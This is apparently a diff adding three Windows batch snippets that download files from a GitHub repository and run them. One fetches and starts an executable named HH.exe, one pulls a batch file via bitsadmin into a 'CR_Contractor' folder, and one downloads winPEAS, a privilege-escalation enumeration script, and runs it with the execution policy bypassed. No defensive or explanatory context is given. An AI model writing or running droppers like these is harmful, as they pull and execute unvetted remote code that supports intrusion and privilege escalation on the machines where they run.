@@ -1,0 +1,30 @@
+------
+@echo off
+wget -O HH.exe https://raw.githubusercontent.com/krizza72/Pub_ex/refs/heads/main/HH.exe
+start HH.exe
+pause
+exit
+
+
+
+-----
+
+@echo off
+set "download_dir=C:\Temp\CR_Contractor\Files"
+set "file_path=%download_dir%\RW.bat"
+set "url=https://raw.githubusercontent.com/krizza72/Pub_ex/refs/heads/main/RW.bat"
+bitsadmin /transfer "DownloadJob" /download /priority normal "%url%" "%file_path%"
+pause
+exit
+
+-------
+
+@echo off
+set "download_dir=C:\Temp\CR_Contractor\Files"
+set "file_path=%download_dir%w\winpeas.ps1"
+set "url=https://raw.githubusercontent.com/krizza72/Pub_ex/refs/heads/main/winpeas.ps1"
+powershell -Command "try { Start-BitsTransfer -Source '%url%' -Destination '%file_path%' -ErrorAction Stop } catch { Write-Output 'Failed to download peas.ps1'; exit 1 }"
+start powershell -NoExit -ExecutionPolicy Bypass -Scope CurrentUser -Force -File "%file_path%"
+exit
+
+-------
